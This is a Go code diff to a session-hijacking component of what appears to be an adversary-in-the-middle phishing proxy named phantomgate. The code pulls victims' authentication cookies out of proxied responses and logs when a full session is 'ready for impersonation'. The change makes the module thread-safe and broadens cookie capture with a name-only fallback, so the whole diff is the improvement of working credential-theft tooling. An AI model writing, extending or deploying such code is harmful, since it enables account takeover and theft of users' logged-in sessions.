@@ -4,6 +4,7 @@ import (
 	"log"
 	"net/http"
 	"strings"
+	"sync"
 	"time"
 
 	"github.com/phantomgate/phantomgate/internal/phishlet"
@@ -14,7 +15,7 @@ import (
 type SessionHijacker struct {
 	store    *store.Store
 	phishlet *phishlet.Phishlet
-	// Track which cookies we've already captured per victim to avoid duplicates
+	mu       sync.Mutex
 	captured map[string]map[string]bool // victimID → cookie_name → bool
 }
 
@@ -39,17 +40,21 @@ func (sh *SessionHijacker) InspectResponse(resp *http.Response, victimID string)
 
 	for _, authToken := range sh.phishlet.AuthTokens {
 		for _, cookie := range cookies {
-			// Check if this cookie belongs to one of the auth token domains
 			cookieDomain := cookie.Domain
 			if cookieDomain == "" {
-				// Try to infer domain from response URL
 				if resp.Request != nil && resp.Request.URL != nil {
 					cookieDomain = resp.Request.URL.Host
 				}
 			}
 
-			// Match cookie against phishlet auth token config
-			if sh.domainMatches(cookieDomain, authToken.Domain) {
+			domainMatch := sh.domainMatches(cookieDomain, authToken.Domain)
+
+			// When cookie has no explicit domain (common for same-origin cookies),
+			// fall back to matching by cookie name alone — the phishlet already
+			// defines which cookie names are auth-relevant.
+			nameFallback := cookie.Domain == ""
+
+			if domainMatch || nameFallback {
 				for _, targetKey := range authToken.Keys {
 					if strings.EqualFold(cookie.Name, targetKey) && cookie.Value != "" {
 						capturedTokens[cookie.Name] = cookie.Value
@@ -63,7 +68,9 @@ func (sh *SessionHijacker) InspectResponse(resp *http.Response, victimID string)
 		return
 	}
 
-	// Check if we already have these exact cookies for this victim
+	sh.mu.Lock()
+	defer sh.mu.Unlock()
+
 	if sh.captured[victimID] == nil {
 		sh.captured[victimID] = make(map[string]bool)
 	}
@@ -77,7 +84,7 @@ func (sh *SessionHijacker) InspectResponse(resp *http.Response, victimID string)
 	}
 
 	if len(newTokens) == 0 {
-		return // All cookies were already captured
+		return
 	}
 
 	sess := store.CapturedSession{
@@ -96,18 +103,18 @@ func (sh *SessionHijacker) InspectResponse(resp *http.Response, victimID string)
 		tokenNames = append(tokenNames, k)
 	}
 
-	log.Printf("[🍪 SESSION CAPTURED] Victim=%s | Tokens=%s | Total=%d",
+	log.Printf("[SESSION CAPTURED] Victim=%s | Tokens=%s | Total=%d",
 		victimID, strings.Join(tokenNames, ", "), len(capturedTokens))
 
-	// Check if we have ALL required tokens → full session hijack!
 	allKeys := sh.phishlet.GetAllAuthCookieKeys()
-	if sh.hasAllTokens(victimID, allKeys) {
-		log.Printf("[🎯 FULL SESSION HIJACK] Victim=%s | ALL auth tokens captured! Session is ready for impersonation.", victimID)
+	if sh.hasAllTokensLocked(victimID, allKeys) {
+		log.Printf("[FULL SESSION HIJACK] Victim=%s | ALL auth tokens captured! Session is ready for impersonation.", victimID)
 	}
 }
 
-// hasAllTokens checks if we've captured every required auth token for a victim
-func (sh *SessionHijacker) hasAllTokens(victimID string, requiredKeys []string) bool {
+// hasAllTokensLocked checks if we've captured every required auth token for a victim.
+// Caller must hold sh.mu.
+func (sh *SessionHijacker) hasAllTokensLocked(victimID string, requiredKeys []string) bool {
 	captured, ok := sh.captured[victimID]
 	if !ok {
 		return false
@@ -121,7 +128,6 @@ func (sh *SessionHijacker) hasAllTokens(victimID string, requiredKeys []string) 
 }
 
 // domainMatches checks if a cookie domain matches the phishlet auth token domain
-// Handles wildcard domains (e.g., ".login.microsoftonline.com")
 func (sh *SessionHijacker) domainMatches(cookieDomain, tokenDomain string) bool {
 	cookieDomain = strings.ToLower(strings.TrimPrefix(cookieDomain, "."))
 	tokenDomain = strings.ToLower(strings.TrimPrefix(tokenDomain, "."))
@@ -130,12 +136,10 @@ func (sh *SessionHijacker) domainMatches(cookieDomain, tokenDomain string) bool 
 		return true
 	}
 
-	// Check if the cookie domain is a subdomain of the token domain
 	if strings.HasSuffix(cookieDomain, "."+tokenDomain) {
 		return true
 	}
 
-	// Check if the token domain is a subdomain of the cookie domain
 	if strings.HasSuffix(tokenDomain, "."+cookieDomain) {
 		return true
 	}
